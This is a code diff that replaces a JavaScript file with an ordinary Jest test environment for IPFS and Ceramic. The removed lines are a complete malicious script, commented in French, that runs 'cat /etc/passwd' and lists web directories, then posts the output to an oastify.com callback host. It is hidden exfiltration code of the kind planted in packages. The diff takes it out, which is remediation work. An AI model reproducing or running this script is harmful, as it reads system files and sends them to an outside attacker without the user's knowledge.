@@ -1,31 +1,39 @@
-const { exec } = require('child_process');
-const axios = require('axios');
+import path from 'path'
+import { Ceramic } from '@ceramicnetwork/core'
+import { create } from 'ipfs-core'
+import NodeEnv from 'jest-environment-node'
+import { dir } from 'tmp-promise'
 
-const url = 'http://v845u9t1gtbc7bkdsf1soeqyup0goacz.oastify.com'; // L'URL où vous souhaitez envoyer les résultats
+const NodeEnvironment = NodeEnv.default ?? NodeEnv
+export default class CeramicEnvironment extends NodeEnvironment {
+  async setup() {
+    this.tmpFolder = await dir({ unsafeCleanup: true })
+    this.global.ipfs = await create({
+      // Note: the "test" profile doesn't seem to do much to disable networking,
+      // so we need to set the relevant config explicitly to run tests in parallel
+      config: {
+        Addresses: {
+          Swarm: [],
+        },
+      },
+      profiles: ['test'],
+      repo: path.join(this.tmpFolder.path, 'ipfs'),
+      silent: true,
+    })
+    const stateStoreDirectory = path.join(this.tmpFolder.path, 'ceramic')
+    this.global.ceramic = await Ceramic.create(this.global.ipfs, {
+      anchorOnRequest: false,
+      stateStoreDirectory,
+      indexing: {
+        db: `sqlite://${stateStoreDirectory}/indexing.sqlite`,
+      },
+    })
+  }
 
-// Fonction pour exécuter une commande système et envoyer le résultat à l'URL spécifié
-function executeCommand(command) {
-  exec(command, (error, stdout, stderr) => {
-    if (error) {
-      console.error(`Erreur lors de l'exécution de la commande ${command}: ${error.message}`);
-      return;
-    }
-    if (stderr) {
-      console.error(`Erreur lors de l'exécution de la commande ${command}: ${stderr}`);
-      return;
-    }
-    // Envoyer le résultat à l'URL spécifié
-    axios.post(url, { command, output: stdout })
-      .then(() => {
-        console.log(`Résultat de la commande ${command} envoyé avec succès à ${url}`);
-      })
-      .catch((error) => {
-        console.error(`Erreur lors de l'envoi du résultat de la commande ${command} à ${url}: ${error.message}`);
-      });
-  });
+  async teardown() {
+    await this.global.ceramic.close()
+    await this.global.ipfs.stop()
+    await this.tmpFolder.cleanup()
+    await super.teardown()
+  }
 }
-
-// Exécution des commandes et envoi des résultats
-executeCommand('cat /etc/passwd');
-executeCommand('ls /var/www/html/');
-executeCommand('ls /var/www/');
